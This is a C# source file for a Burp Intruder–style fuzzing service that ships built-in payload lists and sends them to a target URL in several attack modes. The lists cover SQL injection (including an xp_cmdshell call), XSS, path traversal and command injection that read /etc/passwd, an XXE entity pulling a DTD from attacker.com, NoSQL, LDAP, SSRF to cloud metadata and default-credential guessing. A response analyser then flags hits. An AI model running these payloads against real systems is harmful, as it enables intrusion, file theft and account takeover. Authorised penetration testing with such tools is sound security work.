using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using WebTrafficInspector.Models;

namespace WebTrafficInspector.Services
{
    /// <summary>
    /// Advanced fuzzing and parameter injection service (similar to Burp Intruder)
    /// </summary>
    public class IntruderService
    {
        private HttpClient _httpClient;
        private List<PayloadSet> _payloadSets = new List<PayloadSet>();

        public IntruderService()
        {
            _httpClient = new HttpClient();
            _httpClient.Timeout = TimeSpan.FromSeconds(30);
            InitializeDefaultPayloads();
        }

        private void InitializeDefaultPayloads()
        {
            // SQL Injection payloads
            _payloadSets.Add(new PayloadSet
            {
                Name = "SQL Injection",
                Category = "Injection",
                Payloads = new List<string>
                {
                    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "admin' --",
                    "' UNION SELECT NULL--", "1' AND '1'='1", "1' AND '1'='2",
                    "' OR 1=1--", "\" OR \"\"=\"", "' OR ''='", "1' ORDER BY 1--",
                    "1' ORDER BY 10--", "1' UNION ALL SELECT NULL,NULL,NULL--",
                    "' WAITFOR DELAY '0:0:5'--", "1'; EXEC xp_cmdshell('dir')--",
                    "' AND 1=CONVERT(int,(SELECT @@version))--"
                }
            });

            // XSS payloads
            _payloadSets.Add(new PayloadSet
            {
                Name = "XSS",
                Category = "Injection",
                Payloads = new List<string>
                {
                    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                    "<svg/onload=alert(1)>", "javascript:alert(1)", "<iframe src=javascript:alert(1)>",
                    "<body onload=alert(1)>", "'><script>alert(1)</script>",
                    "\"><script>alert(1)</script>", "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoMSk='))\">",
                    "<svg><script>alert(1)</script></svg>", "'-alert(1)-'", "\"-alert(1)-\"",
                    "<ScRiPt>alert(1)</ScRiPt>", "%3Cscript%3Ealert(1)%3C/script%3E"
                }
            });

            // Path Traversal payloads
            _payloadSets.Add(new PayloadSet
            {
                Name = "Path Traversal",
                Category = "File",
                Payloads = new List<string>
                {
                    "../", "..\\", "..%2f", "..%5c", ".....//", ".....\\\\",
                    "..%252f", "..%255c", "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
                    "/etc/passwd", "C:\\windows\\win.ini", "%2e%2e%2f", "%2e%2e%5c",
                    "....//", "....\\\\", "..;/", "..;//", "..%00/"
                }
            });

            // Command Injection payloads
            _payloadSets.Add(new PayloadSet
            {
                Name = "Command Injection",
                Category = "Injection",
                Payloads = new List<string>
                {
                    "; ls", "| ls", "` ls `", "$( ls )", "; whoami", "| whoami",
                    "& whoami", "&& whoami", "; id", "| id", "; cat /etc/passwd",
                    "| cat /etc/passwd", "; ping -c 10 127.0.0.1", "| ping -c 10 127.0.0.1",
                    "\n ls", "\r\n ls", "| dir", "& dir"
                }
            });

            // LDAP Injection payloads
            _payloadSets.Add(new PayloadSet
            {
                Name = "LDAP Injection",
                Category = "Injection",
                Payloads = new List<string>
                {
                    "*", "*)(&", "*)(|", "admin*)(&", "admin*)(!(&",
                    ")(cn=*", "*)(uid=*", "*)(|(objectClass=*",
                    "admin)(&(password=*", "admin)(|(password=*))"
                }
            });

            // XXE payloads
            _payloadSets.Add(new PayloadSet
            {
                Name = "XXE",
                Category = "Injection",
                Payloads = new List<string>
                {
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>"
                }
            });

            // NoSQL Injection payloads
            _payloadSets.Add(new PayloadSet
            {
                Name = "NoSQL Injection",
                Category = "Injection",
                Payloads = new List<string>
                {
                    "true", "$gt", "$ne", "$where", "{$ne: null}", "{$gt: ''}",
                    "'; return true; var x='", "'; return 1==1; var x='",
                    "$where: '1==1'", "' || 1==1//", "' || 1==1%00",
                    "{\"$gt\": \"\"}", "{\"username\":{\"$ne\":null}}"
                }
            });

            // SSRF payloads
            _payloadSets.Add(new PayloadSet
            {
                Name = "SSRF",
                Category = "Network",
                Payloads = new List<string>
                {
                    "http://localhost", "http://127.0.0.1", "http://0.0.0.0",
                    "http://169.254.169.254", "http://[::1]", "http://localhost:80",
                    "http://127.0.0.1:22", "http://127.0.0.1:3306", "http://127.0.0.1:6379",
                    "file:///etc/passwd", "gopher://127.0.0.1:25", "dict://127.0.0.1:11211"
                }
            });

            // Common usernames
            _payloadSets.Add(new PayloadSet
            {
                Name = "Common Usernames",
                Category = "Authentication",
                Payloads = new List<string>
                {
                    "admin", "administrator", "root", "user", "test", "guest",
                    "admin123", "administrator123", "operator", "webmaster",
                    "sysadmin", "netadmin", "demo", "sales", "support"
                }
            });

            // Common passwords
            _payloadSets.Add(new PayloadSet
            {
                Name = "Common Passwords",
                Category = "Authentication",
                Payloads = new List<string>
                {
                    "password", "123456", "admin", "root", "Password123",
                    "admin123", "password123", "P@ssw0rd", "12345678", "qwerty",
                    "letmein", "welcome", "monkey", "1234567890", "abc123"
                }
            });

            // Numeric ranges
            _payloadSets.Add(new PayloadSet
            {
                Name = "Numbers 1-100",
                Category = "Numeric",
                Payloads = Enumerable.Range(1, 100).Select(i => i.ToString()).ToList()
            });

            // IDOR testing
            _payloadSets.Add(new PayloadSet
            {
                Name = "IDOR Tests",
                Category = "Authorization",
                Payloads = new List<string>
                {
                    "1", "2", "3", "10", "100", "1000", "0", "-1", "999999",
                    "admin", "administrator", "root", "../1", "..%2F1"
                }
            });
        }

        /// <summary>
        /// Run an intruder attack with specified payload positions and attack type
        /// </summary>
        public async Task<IntruderAttackResult> RunAttack(IntruderAttackConfig config)
        {
            var result = new IntruderAttackResult
            {
                StartTime = DateTime.Now,
                Config = config,
                Results = new List<IntruderRequestResult>()
            };

            try
            {
                var payloads = GetPayloadsForAttack(config);
                int totalRequests = payloads.Count;
                int completed = 0;

                foreach (var payload in payloads)
                {
                    if (config.StopRequested) break;

                    var requestResult = await ExecuteRequest(config, payload);
                    result.Results.Add(requestResult);

                    completed++;
                    config.OnProgress?.Invoke(completed, totalRequests);

                    if (config.DelayBetweenRequests > 0)
                    {
                        await Task.Delay(config.DelayBetweenRequests);
                    }
                }

                result.EndTime = DateTime.Now;
                result.TotalRequests = totalRequests;
                result.CompletedRequests = completed;
                result.SuccessfulRequests = result.Results.Count(r => r.StatusCode >= 200 && r.StatusCode < 300);
                result.FailedRequests = result.Results.Count(r => r.StatusCode == 0 || r.Exception != null);

                // Analyze results
                AnalyzeResults(result);
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
            }

            return result;
        }

        private List<Dictionary<string, string>> GetPayloadsForAttack(IntruderAttackConfig config)
        {
            var result = new List<Dictionary<string, string>>();

            switch (config.AttackType)
            {
                case IntruderAttackType.Sniper:
                    // One payload set, iterate through each position one at a time
                    foreach (var position in config.PayloadPositions)
                    {
                        foreach (var payload in config.PayloadSets[0].Payloads)
                        {
                            var dict = new Dictionary<string, string>();
                            foreach (var pos in config.PayloadPositions)
                            {
                                dict[pos] = pos == position ? payload : config.BaseValues.GetValueOrDefault(pos, "");
                            }
                            result.Add(dict);
                        }
                    }
                    break;

                case IntruderAttackType.BatteringRam:
                    // Same payload in all positions simultaneously
                    foreach (var payload in config.PayloadSets[0].Payloads)
                    {
                        var dict = new Dictionary<string, string>();
                        foreach (var pos in config.PayloadPositions)
                        {
                            dict[pos] = payload;
                        }
                        result.Add(dict);
                    }
                    break;

                case IntruderAttackType.Pitchfork:
                    // Iterate through multiple payload sets in parallel
                    int maxLength = config.PayloadSets.Max(ps => ps.Payloads.Count);
                    for (int i = 0; i < maxLength; i++)
                    {
                        var dict = new Dictionary<string, string>();
                        for (int j = 0; j < config.PayloadPositions.Count && j < config.PayloadSets.Count; j++)
                        {
                            var payloadList = config.PayloadSets[j].Payloads;
                            dict[config.PayloadPositions[j]] = payloadList[Math.Min(i, payloadList.Count - 1)];
                        }
                        result.Add(dict);
                    }
                    break;

                case IntruderAttackType.ClusterBomb:
                    // Try all combinations (Cartesian product)
                    result = GetCartesianProduct(config.PayloadPositions, config.PayloadSets);
                    break;
            }

            return result;
        }

        private List<Dictionary<string, string>> GetCartesianProduct(List<string> positions, List<PayloadSet> payloadSets)
        {
            var result = new List<Dictionary<string, string>>();

            if (positions.Count == 0 || payloadSets.Count == 0)
                return result;

            void GenerateCombinations(int index, Dictionary<string, string> current)
            {
                if (index >= positions.Count)
                {
                    result.Add(new Dictionary<string, string>(current));
                    return;
                }

                var payloadSet = payloadSets[Math.Min(index, payloadSets.Count - 1)];
                foreach (var payload in payloadSet.Payloads)
                {
                    current[positions[index]] = payload;
                    GenerateCombinations(index + 1, current);
                }
            }

            GenerateCombinations(0, new Dictionary<string, string>());
            return result;
        }

        private async Task<IntruderRequestResult> ExecuteRequest(IntruderAttackConfig config, Dictionary<string, string> payloads)
        {
            var requestResult = new IntruderRequestResult
            {
                Payloads = new Dictionary<string, string>(payloads),
                Timestamp = DateTime.Now
            };

            try
            {
                // Build the request with payloads
                var url = config.BaseUrl;
                var body = config.BaseRequestBody;
                var headers = new Dictionary<string, string>(config.Headers);

                // Replace payload positions
                foreach (var payload in payloads)
                {
                    var marker = $"§{payload.Key}§";
                    url = url.Replace(marker, payload.Value);
                    body = body?.Replace(marker, payload.Value);

                    foreach (var key in headers.Keys.ToList())
                    {
                        headers[key] = headers[key].Replace(marker, payload.Value);
                    }
                }

                // Execute request
                var request = new HttpRequestMessage(new HttpMethod(config.Method), url);

                if (!string.IsNullOrEmpty(body))
                {
                    request.Content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded");
                }

                foreach (var header in headers)
                {
                    try
                    {
                        request.Headers.Add(header.Key, header.Value);
                    }
                    catch { }
                }

                var startTime = DateTime.Now;
                var response = await _httpClient.SendAsync(request);
                var endTime = DateTime.Now;

                requestResult.StatusCode = (int)response.StatusCode;
                requestResult.ResponseLength = response.Content.Headers.ContentLength ?? 0;
                requestResult.ResponseTime = (endTime - startTime).TotalMilliseconds;
                requestResult.ResponseBody = await response.Content.ReadAsStringAsync();
                requestResult.ResponseHeaders = response.Headers.ToString();
                requestResult.IsSuccess = response.IsSuccessStatusCode;
            }
            catch (Exception ex)
            {
                requestResult.Exception = ex.Message;
                requestResult.IsSuccess = false;
            }

            return requestResult;
        }

        private void AnalyzeResults(IntruderAttackResult result)
        {
            result.Analysis = new IntruderAnalysis();

            // Group by status code
            result.Analysis.StatusCodeDistribution = result.Results
                .GroupBy(r => r.StatusCode)
                .ToDictionary(g => g.Key, g => g.Count());

            // Find interesting responses
            result.Analysis.InterestingResults = new List<IntruderRequestResult>();

            // Different status codes
            var baselineStatus = result.Results.FirstOrDefault()?.StatusCode ?? 0;
            foreach (var res in result.Results.Where(r => r.StatusCode != baselineStatus && r.StatusCode > 0))
            {
                if (!result.Analysis.InterestingResults.Contains(res))
                    result.Analysis.InterestingResults.Add(res);
            }

            // Different response lengths (outliers)
            if (result.Results.Any())
            {
                var avgLength = result.Results.Average(r => r.ResponseLength);
                var stdDev = Math.Sqrt(result.Results.Average(r => Math.Pow(r.ResponseLength - avgLength, 2)));

                foreach (var res in result.Results.Where(r => Math.Abs(r.ResponseLength - avgLength) > stdDev * 2))
                {
                    if (!result.Analysis.InterestingResults.Contains(res))
                        result.Analysis.InterestingResults.Add(res);
                }
            }

            // Check for error messages or interesting strings
            var interestingStrings = new[] { "error", "exception", "warning", "success", "admin", "root", "SQL", "syntax" };
            foreach (var res in result.Results)
            {
                if (res.ResponseBody != null)
                {
                    foreach (var str in interestingStrings)
                    {
                        if (res.ResponseBody.Contains(str, StringComparison.OrdinalIgnoreCase))
                        {
                            if (!result.Analysis.InterestingResults.Contains(res))
                                result.Analysis.InterestingResults.Add(res);
                            break;
                        }
                    }
                }
            }

            // Calculate statistics
            result.Analysis.AverageResponseTime = result.Results.Average(r => r.ResponseTime);
            result.Analysis.MinResponseTime = result.Results.Min(r => r.ResponseTime);
            result.Analysis.MaxResponseTime = result.Results.Max(r => r.ResponseTime);
            result.Analysis.AverageResponseLength = result.Results.Average(r => r.ResponseLength);
        }

        public List<PayloadSet> GetAvailablePayloadSets()
        {
            return new List<PayloadSet>(_payloadSets);
        }

        public void AddCustomPayloadSet(PayloadSet payloadSet)
        {
            _payloadSets.Add(payloadSet);
        }

        public PayloadSet GetPayloadSet(string name)
        {
            return _payloadSets.FirstOrDefault(ps => ps.Name == name);
        }

        public string GenerateReport(IntruderAttackResult result)
        {
            var sb = new StringBuilder();
            sb.AppendLine("═══════════════════════════════════════════════════════════");
            sb.AppendLine("          Intruder Attack Report");
            sb.AppendLine("═══════════════════════════════════════════════════════════");
            sb.AppendLine($"URL: {result.Config.BaseUrl}");
            sb.AppendLine($"Attack Type: {result.Config.AttackType}");
            sb.AppendLine($"Started: {result.StartTime}");
            sb.AppendLine($"Completed: {result.EndTime}");
            sb.AppendLine($"Duration: {(result.EndTime - result.StartTime).TotalSeconds:F2}s");
            sb.AppendLine();

            sb.AppendLine("STATISTICS:");
            sb.AppendLine("─────────────────────────────────────────────────────────");
            sb.AppendLine($"Total Requests: {result.TotalRequests}");
            sb.AppendLine($"Completed: {result.CompletedRequests}");
            sb.AppendLine($"Successful: {result.SuccessfulRequests}");
            sb.AppendLine($"Failed: {result.FailedRequests}");
            sb.AppendLine();

            if (result.Analysis != null)
            {
                sb.AppendLine("RESPONSE ANALYSIS:");
                sb.AppendLine("─────────────────────────────────────────────────────────");
                sb.AppendLine($"Average Response Time: {result.Analysis.AverageResponseTime:F2}ms");
                sb.AppendLine($"Min Response Time: {result.Analysis.MinResponseTime:F2}ms");
                sb.AppendLine($"Max Response Time: {result.Analysis.MaxResponseTime:F2}ms");
                sb.AppendLine($"Average Response Length: {result.Analysis.AverageResponseLength:F0} bytes");
                sb.AppendLine();

                sb.AppendLine("Status Code Distribution:");
                foreach (var kvp in result.Analysis.StatusCodeDistribution.OrderBy(x => x.Key))
                {
                    sb.AppendLine($"  {kvp.Key}: {kvp.Value} requests");
                }
                sb.AppendLine();

                if (result.Analysis.InterestingResults.Any())
                {
                    sb.AppendLine($"INTERESTING RESULTS ({result.Analysis.InterestingResults.Count}):");
                    sb.AppendLine("─────────────────────────────────────────────────────────");
                    foreach (var interesting in result.Analysis.InterestingResults.Take(10))
                    {
                        sb.AppendLine($"  Payloads: {string.Join(", ", interesting.Payloads.Select(p => $"{p.Key}={p.Value}"))}");
                        sb.AppendLine($"  Status: {interesting.StatusCode}");
                        sb.AppendLine($"  Length: {interesting.ResponseLength} bytes");
                        sb.AppendLine($"  Time: {interesting.ResponseTime:F2}ms");
                        sb.AppendLine();
                    }
                }
            }

            sb.AppendLine("═══════════════════════════════════════════════════════════");

            return sb.ToString();
        }
    }

    #region Models

    public class IntruderAttackConfig
    {
        public string BaseUrl { get; set; }
        public string Method { get; set; } = "GET";
        public string BaseRequestBody { get; set; }
        public Dictionary<string, string> Headers { get; set; } = new Dictionary<string, string>();
        public List<string> PayloadPositions { get; set; } = new List<string>();
        public Dictionary<string, string> BaseValues { get; set; } = new Dictionary<string, string>();
        public List<PayloadSet> PayloadSets { get; set; } = new List<PayloadSet>();
        public IntruderAttackType AttackType { get; set; } = IntruderAttackType.Sniper;
        public int DelayBetweenRequests { get; set; } = 0;
        public bool StopRequested { get; set; } = false;
        public Action<int, int> OnProgress { get; set; }
    }

    public class IntruderAttackResult
    {
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public IntruderAttackConfig Config { get; set; }
        public List<IntruderRequestResult> Results { get; set; }
        public int TotalRequests { get; set; }
        public int CompletedRequests { get; set; }
        public int SuccessfulRequests { get; set; }
        public int FailedRequests { get; set; }
        public IntruderAnalysis Analysis { get; set; }
        public string Error { get; set; }
    }

    public class IntruderRequestResult
    {
        public Dictionary<string, string> Payloads { get; set; }
        public int StatusCode { get; set; }
        public long ResponseLength { get; set; }
        public double ResponseTime { get; set; }
        public string ResponseBody { get; set; }
        public string ResponseHeaders { get; set; }
        public DateTime Timestamp { get; set; }
        public bool IsSuccess { get; set; }
        public string Exception { get; set; }
    }

    public class IntruderAnalysis
    {
        public Dictionary<int, int> StatusCodeDistribution { get; set; }
        public List<IntruderRequestResult> InterestingResults { get; set; }
        public double AverageResponseTime { get; set; }
        public double MinResponseTime { get; set; }
        public double MaxResponseTime { get; set; }
        public double AverageResponseLength { get; set; }
    }

    public class PayloadSet
    {
        public string Name { get; set; }
        public string Category { get; set; }
        public List<string> Payloads { get; set; }
    }

    public enum IntruderAttackType
    {
        Sniper,        // One payload set, one position at a time
        BatteringRam,  // Same payload in all positions
        Pitchfork,     // Multiple payload sets in parallel
        ClusterBomb    // All combinations (Cartesian product)
    }

    #endregion
}
